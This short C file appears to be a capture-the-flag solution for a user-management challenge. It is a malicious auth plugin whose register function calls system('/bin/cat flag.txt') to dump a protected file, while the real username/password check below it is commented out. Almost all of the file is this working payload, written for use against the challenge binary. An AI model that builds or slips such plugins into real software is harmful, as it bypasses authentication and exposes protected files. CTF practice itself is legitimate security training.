#include <string.h>
#include <stdlib.h>

#include "usrmngr.h"

char plugin_prompt_string[] = "Logout";


bool plugin_register(user_management_t* usrmngr)
{
  system("/bin/cat flag.txt");
  return false;

/*
  char username[MAX_USERNAME_LENGTH + 1]= {0, };
  char password[MAX_PASSWORD_LENGTH + 1]= {0, };
  puts("loading auth plugin\n");
  puts("Welcome. please authenticate yourself:");
  puts("username:");
  fgets(username, MAX_USERNAME_LENGTH, stdin);
  puts("password:");
  fgets(password, MAX_PASSWORD_LENGTH, stdin);
  *(strchr(username, '\n')) = '\0';
  *(strchr(password, '\n')) = '\0';
  for (size_t i = 0; i < usrmngr->num_users; ++i) {
    user_data_t* user = &usrmngr->users[i];
    if (strncmp(user->username, username, MAX_USERNAME_LENGTH) == 0) {
      if (strncmp(user->password, password, MAX_PASSWORD_LENGTH) == 0) {
        printf("Success!\nWelcome %s\n", user->username);
        return true;
      }
    }
  }

  puts("Failed to authenticate as a user!!!\n");

  return false;
*/
}


bool plugin_handler(user_management_t* usrmngr)
{
  exit(0);
}
